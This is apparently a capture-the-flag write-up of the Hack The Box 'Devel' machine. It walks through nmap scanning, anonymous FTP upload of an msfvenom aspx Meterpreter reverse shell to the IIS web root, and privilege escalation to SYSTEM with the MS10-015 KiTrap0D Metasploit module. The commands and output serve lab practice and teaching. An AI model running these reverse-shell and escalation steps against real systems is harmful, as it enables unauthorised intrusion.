## ----------->> Devel <<------------

// We start with nmap scan

    $ nmap -sV -A -P -T4 10.10.10.5 -p-
------

    Nmap scan report for 10.10.10.5
    Host is up (0.20s latency).
    Not shown: 65533 filtered ports
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     Microsoft ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | 03-18-17  02:06AM       <DIR>          aspnet_client
    | 03-17-17  05:37PM                  689 iisstart.htm
    |_03-17-17  05:37PM               184946 welcome.png
    | ftp-syst: 
    |_  SYST: Windows_NT
    80/tcp open  http    Microsoft IIS httpd 7.5
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/7.5
    |_http-title: IIS7
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

// Navigating to http://10.10.10.5/ ,we see only photo 

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Devel/1.png)

// nothing much there, lets check if the ftp have anonymous connection

    $ ftp -p 10.10.10.5
-----

    Connected to 10.10.10.5.
    220 Microsoft FTP Service
    Name (10.10.10.5:kali): anonymous
    331 Anonymous access allowed, send identity (e-mail name) as password.
    Password:
    230 User logged in.
    Remote system type is Windows_NT.
    
// We have connection !, lets check what Files are in the current directory

    ftp> dir
    227 Entering Passive Mode (10,10,10,5,192,5).
    125 Data connection already open; Transfer starting.
    03-18-17  02:06AM       <DIR>          aspnet_client
    03-17-17  05:37PM                  689 iisstart.htm
    03-17-17  05:37PM               184946 welcome.png
    226 Transfer complete.

// We have a photo called welcome.png 

// Checking on the website source i can see that the image there called welcom.png too

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Devel/2.png)

// Its must be the same directory!, Lets try to upload reverse shell

// First check with which files could the server work with

    $ curl -i http://10.10.10.5/
-----

    HTTP/1.1 200 OK
    Content-Type: text/html
    Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
    Accept-Ranges: bytes
    ETag: "37b5ed12c9fd21:0"
    Server: Microsoft-IIS/7.5
    X-Powered-By: ASP.NET
    Date: Sat, 07 Aug 2021 09:16:18 GMT
    Content-Length: 689
// ASP.NET means that we can use .aspx files

// Lets generate aspx payload with MsfVenom

    $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.8 LPORT=1444 -f aspx > devel.aspx
// And move the file to target with ftp 'put' command

    ftp> put devel.aspx
    
// Lets open a listiner with Metasploit multi/handler

    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    PAYLOAD => windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LPORT 1444
    LPORT => 1444
    msf6 exploit(multi/handler) > set LHOST 10.10.17.8
    LHOST => 10.10.16.197
    msf6 exploit(multi/handler) > set ExitOnSession false 
    ExitOnSession => false
    msf6 exploit(multi/handler) > exploit -j
    
// Now that all set we can navigate to http://10.10.10.5/devel.aspx

    [*] Meterpreter session 1 opened (10.10.17.8:1444 -> 10.10.10.5:49239) at 2021-08-07 10:26:16 +0000

// We got connection !

    meterpreter > getuid
    Server username: IIS APPPOOL\Web

    meterpreter > sysinfo
    Computer        : DEVEL
    OS              : Windows 7 (6.1 Build 7600).
    Architecture    : x86
    System Language : el_GR
    Domain          : HTB
    Logged On Users : 0
    Meterpreter     : x86/windows

// Lest use Metasploit module '/multi/recon/local_exploit_suggester'
    
    meterpreter > background
    
    msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester

    msf6 post(multi/recon/local_exploit_suggester) > set session 1
    session => 1
    msf6 post(multi/recon/local_exploit_suggester) > exploit


// Getting ERROR, Didnt wiork for me...

    msf6 post(multi/recon/local_exploit_suggester) > exploit

    [*] 10.10.10.5 - Collecting local exploits for x86/windows...
    [*] 10.10.10.5 - 38 exploit checks are being tried...
    [+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
    [-] 10.10.10.5 - Post failed: NoMethodError undefined method `reverse!' for nil:NilClass

// We can also use python script [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)(By AonCyberLabs) 

// Back to our meterpreter and open a shell

    meterpreter > shell
    Process 2248 created.
    Channel 2 created.
    Microsoft Windows [Version 6.1.7600]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    c:\windows\system32\inetsrv>
    
// Execute 'systeminfo' command
    
    c:\windows\system32\inetsrv>systeminfo
    systeminfo

    Host Name:                 DEVEL
    OS Name:                   Microsoft Windows 7 Enterprise 
    OS Version:                6.1.7600 N/A Build 7600
    OS Manufacturer:           Microsoft Corporation
    OS Configuration:          Standalone Workstation
    OS Build Type:             Multiprocessor Free
    Registered Owner:          babis
    Registered Organization:   
    Product ID:                55041-051-0948536-86302
    Original Install Date:     17/3/2017, 4:17:31 ��
    System Boot Time:          7/8/2021, 11:58:04 ��
    System Manufacturer:       VMware, Inc.
    System Model:              VMware Virtual Platform
    System Type:               X86-based PC
    Processor(s):              1 Processor(s) Installed.
                               [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
    BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
    Windows Directory:         C:\Windows
    System Directory:          C:\Windows\system32
    Boot Device:               \Device\HarddiskVolume1
    System Locale:             el;Greek
    Input Locale:              en-us;English (United States)
    Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
    Total Physical Memory:     3.071 MB
    Available Physical Memory: 2.539 MB
    Virtual Memory: Max Size:  6.141 MB
    Virtual Memory: Available: 5.553 MB
    Virtual Memory: In Use:    588 MB
    Page File Location(s):     C:\pagefile.sys
    Domain:                    HTB
    Logon Server:              N/A
    Hotfix(s):                 N/A
    Network Card(s):           1 NIC(s) Installed.
                               [01]: vmxnet3 Ethernet Adapter
                                     Connection Name: Local Area Connection 3
                                     DHCP Enabled:    No
                                     IP address(es)
                                     [01]: 10.10.10.5
                                     [02]: fe80::58c0:f1cf:abc6:bb9e
                                     [03]: dead:beef::b8d4:921f:136a:726b
                                     [04]: dead:beef::58c0:f1cf:abc6:bb9e


// Copy the output to file systeminfo.txt

// And run Windows-Exploit-Suggester.py

    $ python windows-exploit-suggester.py --database 2021-07-08-mssb.xls --systeminfo systeminfo.txt 
------

    [*] initiating winsploit version 3.3...
    [*] database file detected as xls or xlsx based on extension
    [*] attempting to read from the systeminfo input file
    [+] systeminfo input file read successfully (utf-8)
    [*] querying database file for potential vulnerabilities
    [*] comparing the 0 hotfix(es) against the 179 potential bulletins(s) with a database of 137 known exploits
    [*] there are now 179 remaining vulns
    [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
    [+] windows version identified as 'Windows 7 32-bit'
    [*] 
    [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
    [M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
    [E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
    [*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
    [*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
    [*] 
    [E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
    [M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
    [M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
    [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
    [E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
    [M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
    [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
    [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
    [*] done

// Lets search MS10-015 in Metasploit

    meterpreter > background 
    [*] Backgrounding session 1...
    
    msf6 post(multi/recon/local_exploit_suggester) > search MS10-015

    Matching Modules
    ================

       #  Name                                     Disclosure Date  Rank   Check  Description
       -  ----                                     ---------------  ----   -----  -----------
       0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D


    Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/ms10_015_kitrap0d

// We did found module called ms10_015_kitrap0d

    msf6 post(multi/recon/local_exploit_suggester) > use 0
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

    msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 1
    session => 1
    msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost 10.10.17.8
    lhost => 10.10.17.8
    msf6 exploit(windows/local/ms10_015_kitrap0d) > set lport 1445
    lport => 1445
    msf6 exploit(windows/local/ms10_015_kitrap0d) > exploit 

    [*] Started reverse TCP handler on 10.10.17.8:1445 
    [*] Launching notepad to host the exploit...
    [+] Process 3292 launched.
    [*] Reflectively injecting the exploit DLL into 3292...
    [*] Injecting exploit into 3292 ...
    [*] Exploit injected. Injecting payload into 3292...
    [*] Payload injected. Executing exploit...
    [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
    [*] Sending stage (175174 bytes) to 10.10.10.5
    [*] Meterpreter session 2 opened (10.10.17.8:1445 -> 10.10.10.5:49240) at 2021-08-07 10:45:38 +0000

    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM

// We got NT/SYSTEM !!!

meterpreter > cat user.txt.txt 
9ecdd6a3a...................

meterpreter > cat root.txt 
e621a0b50...................
